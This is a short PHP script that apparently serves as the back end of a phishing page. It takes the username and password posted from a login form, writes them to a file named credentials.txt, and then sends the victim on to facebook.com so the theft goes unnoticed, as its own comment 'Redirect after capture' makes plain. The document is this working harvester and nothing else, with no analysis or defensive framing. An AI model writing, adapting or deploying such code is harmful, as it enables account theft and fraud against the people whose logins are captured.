<?php
$file = fopen("credentials.txt", "a");
fwrite($file, "User: " . $_POST['username'] . " | Pass: " . $_POST['password'] . "\n");
fclose($file);
header("Location: https://facebook.com"); // Redirect after capture
exit;
?>